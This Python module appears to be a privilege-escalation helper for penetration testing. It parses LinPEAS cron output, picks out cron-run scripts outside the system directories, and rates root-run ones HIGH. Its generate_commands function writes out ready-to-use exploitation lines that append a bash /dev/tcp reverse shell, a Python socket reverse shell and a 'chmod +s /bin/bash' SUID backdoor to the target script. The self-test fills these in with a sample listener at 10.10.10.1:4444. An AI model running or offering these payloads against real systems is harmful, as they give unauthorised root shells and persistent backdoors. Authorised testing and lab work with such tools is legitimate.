"""Analyze cron job findings from LinPEAS output."""

import re
from typing import List, Dict

# Matches a cron schedule: 5 fields of digits/*/,/-
_SCHEDULE_RE = re.compile(
    r"((?:[\d*/,\-]+\s+){4}[\d*/,\-]+)"  # 5 cron fields
    r"\s+(\S+)"                            # user
    r"\s+(\S.*)"                           # command
)

# Strip file-path prefix like "/etc/cron.d/foo: " or "crontab: "
_PREFIX_RE = re.compile(r"^[^:]+:\s+")


def parse_cron_section(section_text: str) -> List[Dict]:
    """Extract cron jobs from a LinPEAS cron section."""
    jobs: List[Dict] = []
    seen = set()

    for raw_line in section_text.splitlines():
        line = raw_line.strip()
        if not line or line.startswith("#"):
            continue

        # Remove file-path prefix if present (e.g. "/etc/cron.d/logrotate: ...")
        line = _PREFIX_RE.sub("", line)

        m = _SCHEDULE_RE.match(line)
        if not m:
            continue

        schedule = m.group(1).strip()
        user = m.group(2).strip()
        command = m.group(3).strip()

        key = (schedule, user, command)
        if key in seen:
            continue
        seen.add(key)

        jobs.append({"schedule": schedule, "user": user, "command": command})

    return jobs


def find_writable_scripts(cron_jobs: List[Dict]) -> List[Dict]:
    """Return findings for cron jobs whose command is an absolute script path."""
    targets: List[Dict] = []
    seen = set()

    for job in cron_jobs:
        # Take only the first token of command (ignore arguments)
        binary = job["command"].split()[0]

        if not binary.startswith("/"):
            continue

        # Skip binaries in standard system directories (not user-writable scripts)
        _SYSTEM_DIRS = ("/bin/", "/sbin/", "/usr/bin/", "/usr/sbin/",
                        "/usr/lib/", "/lib/", "/snap/")
        if any(binary.startswith(d) for d in _SYSTEM_DIRS):
            continue

        key = (binary, job["schedule"], job["user"])
        if key in seen:
            continue
        seen.add(key)

        targets.append({
            "script": binary,
            "schedule": job["schedule"],
            "user": job["user"],
        })

    return targets


def generate_commands(
    script_path: str,
    lhost: str = "LHOST",
    lport: str = "LPORT",
) -> List[str]:
    """Generate exploitation commands for a writable cron script."""
    return [
        f"echo 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1' >> {script_path}",
        (
            f"echo 'python3 -c \\'import socket,subprocess,os;"
            f"s=socket.socket();s.connect((\"{lhost}\",{lport}));"
            f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
            f"subprocess.call([\"/bin/sh\",\"-i\"])\\'' >> {script_path}"
        ),
        f"echo 'chmod +s /bin/bash' >> {script_path}",
    ]


def analyze(section_text: str) -> List[Dict]:
    """Parse cron section and return privesc findings."""
    jobs = parse_cron_section(section_text)
    targets = find_writable_scripts(jobs)

    # Deduplicate by script path — keep the highest-privilege entry
    seen_scripts: Dict[str, Dict] = {}
    for t in targets:
        severity = "HIGH" if t["user"] == "root" else "MEDIUM"
        existing = seen_scripts.get(t["script"])
        if existing is None or (severity == "HIGH" and existing["severity"] != "HIGH"):
            seen_scripts[t["script"]] = {
                "script": t["script"],
                "schedule": t["schedule"],
                "run_as": t["user"],
                "severity": severity,
                "type": "cron",
                "commands": generate_commands(t["script"]),
            }

    return list(seen_scripts.values())


# ── Self-test ──────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    SAMPLE = """
# /etc/crontab
* * * * * root /opt/scripts/backup.sh
*/5 * * * * www-data /var/scripts/cleanup.py
/etc/cron.d/logrotate: 0 2 * * * root /usr/sbin/logrotate /etc/logrotate.conf
@reboot root /opt/init.sh
# comment line
*/10 * * * * root /opt/scripts/backup.sh
"""

    print("=== parse_cron_section ===")
    jobs = parse_cron_section(SAMPLE)
    for j in jobs:
        print(j)

    print("\n=== find_writable_scripts ===")
    targets = find_writable_scripts(jobs)
    for t in targets:
        print(t)

    print("\n=== generate_commands ===")
    for cmd in generate_commands("/opt/scripts/backup.sh", "10.10.10.1", "4444"):
        print(cmd)

    print("\n=== analyze ===")
    findings = analyze(SAMPLE)
    for f in findings:
        print(f"[{f['severity']}] {f['script']} (run as {f['run_as']}, {f['schedule']})")
        for cmd in f["commands"]:
            print(f"  {cmd}")
